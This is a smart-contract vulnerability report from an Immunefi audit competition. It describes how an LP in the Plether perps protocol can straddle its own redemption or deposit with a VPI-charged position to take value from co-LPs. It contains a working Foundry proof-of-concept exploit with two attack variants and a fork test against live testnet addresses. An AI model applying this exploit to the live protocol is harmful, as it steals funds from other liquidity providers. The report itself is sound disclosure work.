# \#99334 [SC-Critical] Opening a position before a redemption and closing it after extracts a self-refunding VPI charge from co-LPs

**Submitted on Nov 13th 2026 at 08:07:47 UTC by @krlz for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99334
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

An LP that also trades can take value from the other LPs of its tranche at an unchanged price by opening a position just before its own redemption settles and closing it just after. The open's VPI charge is booked as tranche revenue at once and raises the NAV the redemption settles at, while the close pays the same charge back out of the pool. The straddling LP leaves with its share of the charge, and the LPs who stay fund the refund.

## Vulnerability Details

`HousePool` prices LP entry and exit from the pool's physical assets (`HousePoolAccountingLib.sol#L63`). A skew-increasing open pays its VPI charge into those assets. The charge is booked as Junior revenue at once (`recordClaimantInflow(…, Revenue, CashArrived)`, `CfdEngineSettlementSidecar.sol#L454-L462`) and raises the NAV a redemption settles at (`HousePool.sol#L835-L841`).

But the charge is refundable. The close computes a symmetric VPI from the skew it removes (`CloseAccountingLib.sol#L108-L110`) and pays the charge back out of the pool, as the whitepaper's own example states: "The VPI charge is $20,000. Reversing the move at unchanged depth produces a $20,000 rebate before the lifetime clamp" (`WHITEPAPER.md#L903-L904`). While the position is open, NAV counts as revenue an amount that the close takes back.

An LP that trades can open a skew-increasing position before the epoch settles, redeem at the inflated NAV, and close at the same price. This departs from the project's stated intent. Cohort timing transfers are accepted explicitly for carry, as a policy "with no historical LP cohort allocation" (`WHITEPAPER.md#L974-L977`), and nowhere for VPI. For the opposite sign of VPI the design guards against exactly this: a rebate the trader must return at close is held in a reserve that NAV excludes, "so LPs cannot withdraw it as marked equity before the matching position obligation settles" (`WHITEPAPER.md#L887-L888`). The charge has no such guard, so a redeeming LP withdraws its share of it before the close returns it. The project keeps anticipated VPI out of symmetric LP NAV so that it cannot inflate NAV (`SECURITY.md#L872`), but a charge the close will pay back counts in NAV in full.

## Impact Details

The straddling LP takes value from the co-LPs of its tranche at an unchanged price and after all fees and carry. The round trip is profitable once its share of the tranche exceeds about 0.4: at the 40% skew limit the charge is 0.2% of notional against 0.08% of round-trip execution fees.

In the PoC, against a baseline with no trade, the straddling LP ends +1,027.51 USDG and the remaining Junior LP −1,817.93 USDG per round, about 0.18% of its capital. Tranche yield leaves with the redemption. A VPI charge is LP revenue, and an LP collects revenue only by redeeming. The straddling LP redeems its share of a charge the tranche does not keep, the remaining LPs pay the whole charge back, and the round trip is repeatable.

## Link to Proof of Concept

https://gist.github.com/KirillZiborov/e29a4d569e204eb6197af0ff8cd3a15b

## Proof of Concept

## Proof of Concept

`VpiChargeStraddle.testLocal` runs the redemption straddle in the repository's perps test suite (`BasePerpTest`) at the release risk parameters, through the public Router and tranche vault with mock Pyth prices.

1. An LP holding two thirds of the Junior tranche requests to redeem its shares.
2. Before the epoch settles, it opens a position near the skew limit. The VPI charge (3,918.83 USDG) is booked as Junior revenue and raises the tranche NAV.
3. It settles the redemption at the inflated NAV and claims 2,002,587.32 USDG, against 1,999,975.60 USDG in the no-trade baseline.
4. It closes the position at the same price. Pool depth has fallen from 5.0M to 3.0M USDG, so the lifetime clamp binds and the close rebates exactly the charge. The straddling LP ends +1,027.51 USDG and the remaining Junior LP −1,817.93 USDG.

`VpiRebateReserveStraddle.testLocal` runs the same round trip around a deposit. A skew-reducing open's rebate (758.41 USDG) lowers NAV until the close returns it, the LP deposits at the lowered NAV, and after the close it nets +370.22 USDG while the incumbents lose 682.43 USDG. `VpiChargeStraddle.testFork` runs against the live v2.0.0 deployment on Arbitrum Sepolia at block 325381938, whose code is the audited version, and checks the premises: the Junior tranche holds LP capital, `vpiFactor` is 0.01e18, and the engine is neither degraded nor frozen.

Save the code as `packages/perps/test/perps/PoC.t.sol` and run `forge test --root packages/perps --match-path test/perps/PoC.t.sol -vv`. The fork test reads `ARBITRUM_SEPOLIA_RPC_URL`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

abstract contract VpiStraddleBase is BasePerpTest {
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _routerTrade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint64 id = router.nextCommitId();
        vm.prank(account);
        router.commitOrder(side, size, margin, 0, isClose);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, _mockPythUpdateData(price));
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "router order executed");
    }
}

/// A Junior LP opens a skew-increasing position before its own redemption settles and closes it after:
/// the redemption prices at the VPI-charge-inflated NAV, and the remaining Junior LPs pay for it.
contract VpiChargeStraddle is VpiStraddleBase {
    address internal constant VICTIM = address(0xA11CE);
    address internal constant ATTACKER = address(0xBADD);
    address internal constant SENIOR_LP = address(0x5E1);

    // Live v2.0.0 Arbitrum Sepolia addresses.
    uint256 internal constant FORK_BLOCK = 325381938;
    address internal constant LIVE_ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant LIVE_JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        vm.label(VICTIM, "incumbent-junior-lp");
        vm.label(ATTACKER, "straddling-lp");
        _fundSenior(SENIOR_LP, 2_000_000e6);
        _fundJunior(VICTIM, 1_000_000e6);
        _fundJunior(ATTACKER, 2_000_000e6);
        _fundTrader(ATTACKER, 100_000e6);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
    }

    function testLocal() public {
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);
        uint256 victimShares = juniorVault.balanceOf(VICTIM);

        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        vm.warp(juniorVault.depositEpochStart(requestId) + 10);
        vm.roll(block.number + 1);
        uint256 snap = vm.snapshotState();

        // Baseline: the same redemption settled with no straddling trade.
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        vm.startPrank(ATTACKER);
        uint256 baselineRedeemed = juniorVault.claimRedeem(
            requestId, juniorVault.claimableRedeemRequest(requestId, ATTACKER), ATTACKER, ATTACKER
        );
        vm.stopPrank();
        router.updateMarkPrice(_mockPythUpdateData(1e8));
        uint256 baselineVictimValue = juniorVault.convertToAssets(victimShares);
        uint256 baselineAttackerWealth = baselineRedeemed + clearinghouse.balanceAssets(ATTACKER);

        vm.revertToState(snap);

        // Attack: open a skew-increasing position, settle the redemption at the inflated NAV, claim, then close.
        uint256 size = 1_980_000e18; // 1.98M USDG notional at 1.00
        uint256 poolBeforeOpen = pool.totalAssets();
        _routerTrade(ATTACKER, CfdTypes.Side.LONG, size, 50_000e6, false, 1e8);
        uint256 vpiCharge = pool.totalAssets() - poolBeforeOpen;

        router.settleLpEpoch(_mockPythUpdateData(1e8));
        vm.startPrank(ATTACKER);
        uint256 attackRedeemed = juniorVault.claimRedeem(
            requestId, juniorVault.claimableRedeemRequest(requestId, ATTACKER), ATTACKER, ATTACKER
        );
        vm.stopPrank();

        _routerTrade(ATTACKER, CfdTypes.Side.LONG, size, 0, true, 1e8);
        (uint256 sizeAfter,,,,,,) = engine.positions(ATTACKER);
        assertEq(sizeAfter, 0, "position closed at the same price");

        uint256 attackVictimValue = juniorVault.convertToAssets(victimShares);
        uint256 attackAttackerWealth = attackRedeemed + clearinghouse.balanceAssets(ATTACKER);

        emit log_named_uint("open VPI charge booked as Junior revenue (USDG)", vpiCharge);
        emit log_named_uint("baseline redemption (USDG)", baselineRedeemed);
        emit log_named_uint("straddle redemption (USDG)", attackRedeemed);

        assertGt(attackRedeemed, baselineRedeemed, "redemption priced at the VPI-inflated NAV");
        assertGt(attackAttackerWealth, baselineAttackerWealth, "attacker ends richer after fees and price risk");
        assertLt(attackVictimValue, baselineVictimValue, "the remaining Junior LP is strictly poorer");
        emit log_named_uint("attacker net gain per round (USDG)", attackAttackerWealth - baselineAttackerWealth);
        emit log_named_uint("incumbent Junior LP loss per round (USDG)", baselineVictimValue - attackVictimValue);
    }

    function testFork() public {
        vm.createSelectFork(vm.envString("ARBITRUM_SEPOLIA_RPC_URL"), FORK_BLOCK);

        // Premise: the Junior tranche holds LP capital that the straddle extracts value from.
        uint256 liveJuniorAssets = IJuniorView(LIVE_JUNIOR_VAULT).totalAssets();
        emit log_named_uint("live Junior tranche assets (USDG)", liveJuniorAssets);
        assertGt(liveJuniorAssets, 1_000_000e6, "the live Junior tranche holds LP capital");

        // Premise: VPI is charged/rebated at the release factor, so open-time VPI enters and leaves NAV.
        CfdTypes.RiskParams memory rp = IEngineRisk(LIVE_ENGINE).riskParams();
        emit log_named_uint("live VPI factor (1e18)", rp.vpiFactor);
        assertEq(rp.vpiFactor, 0.01e18, "live VPI factor is the release value");

        // Premise: normal pricing regime, so an open-then-close straddle at an unchanged price is possible.
        assertFalse(IEngineRisk(LIVE_ENGINE).degradedMode(), "live engine not degraded");
        assertFalse(IEngineRisk(LIVE_ENGINE).isOracleFrozen(), "no live frozen window");
    }
}

/// A skew-reducing open pays its VPI rebate into a reserve that LP NAV ignores; an LP deposits at the
/// depressed NAV, then closes so the clamp returns the reserve to the pool as revenue.
contract VpiRebateReserveStraddle is VpiStraddleBase {
    address internal skewCreator = address(0xA11CE);
    address internal attacker = address(0xBADBAD);

    function _juniorPending() internal view returns (uint256 juniorAssets) {
        (, juniorAssets) = pool.getPendingDepositTrancheState();
    }

    function testLocal() public {
        vm.label(attacker, "depositing-lp");
        uint256 price = 1e8;
        uint256 size = 3900 * 1e20; // 390,000 USDG notional
        router.updateMarkPrice(_mockPythUpdateData(price));

        _fundTrader(skewCreator, 20_000e6);
        _routerTrade(skewCreator, CfdTypes.Side.LONG, size, 10_000e6, false, price);
        uint256 juniorAfterSkew = _juniorPending();

        _fundTrader(attacker, 20_000e6);
        _routerTrade(attacker, CfdTypes.Side.SHORT, size, 10_000e6, false, price);
        uint256 rebateReserve = clearinghouse.vpiRebateReserveAssets(attacker);
        emit log_named_uint("attacker VPI rebate reserve, excluded from NAV (USDG)", rebateReserve);
        emit log_named_uint("Junior NAV drop from the excluded reserve (USDG)", juniorAfterSkew - _juniorPending());
        assertGt(rebateReserve, 0, "rebate paid into the NAV-excluded reserve");

        uint256 depositAssets = 9_000_000e6;
        settlementToken.mint(attacker, depositAssets);
        vm.startPrank(attacker);
        settlementToken.approve(address(juniorVault), depositAssets);
        uint256 requestId = juniorVault.requestDeposit(depositAssets, attacker, attacker);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(requestId));
        router.settleLpEpoch(_mockPythUpdateData(price));
        vm.prank(attacker);
        uint256 shares = juniorVault.claimDeposit(requestId, depositAssets, attacker, attacker);
        assertGt(shares, 0, "deposit claimed at the depressed NAV");

        _routerTrade(attacker, CfdTypes.Side.SHORT, size, 0, true, price);
        assertEq(clearinghouse.vpiRebateReserveAssets(attacker), 0, "reserve returned to the pool at close");

        uint256 lpValue = juniorVault.estimateRedeemAssets(shares);
        uint256 tradingCost = 20_000e6 - clearinghouse.balanceAssets(attacker);
        uint256 incumbentAfter = _juniorPending() - lpValue;
        emit log_named_uint("attacker LP value after close (USDG)", lpValue);
        emit log_named_uint("attacker trading cost, fees and carry (USDG)", tradingCost);
        emit log_named_uint("incumbent Junior value before (USDG)", juniorAfterSkew);
        emit log_named_uint("incumbent Junior value after (USDG)", incumbentAfter);
        assertGt(lpValue, depositAssets, "LP value rises as the reserve is restored into NAV");
        assertGt(lpValue - depositAssets, tradingCost, "net profit after trading costs");
        assertLt(incumbentAfter, juniorAfterSkew, "incumbent Junior LPs are strictly poorer");
        emit log_named_uint("attacker net profit per cycle (USDG)", (lpValue - depositAssets) - tradingCost);
        emit log_named_uint("incumbent Junior loss per cycle (USDG)", juniorAfterSkew - incumbentAfter);
    }
}

interface IJuniorView {
    function totalAssets() external view returns (uint256);
}

interface IEngineRisk {
    function riskParams() external view returns (CfdTypes.RiskParams memory);
    function degradedMode() external view returns (bool);
    function isOracleFrozen() external view returns (bool);
}
```
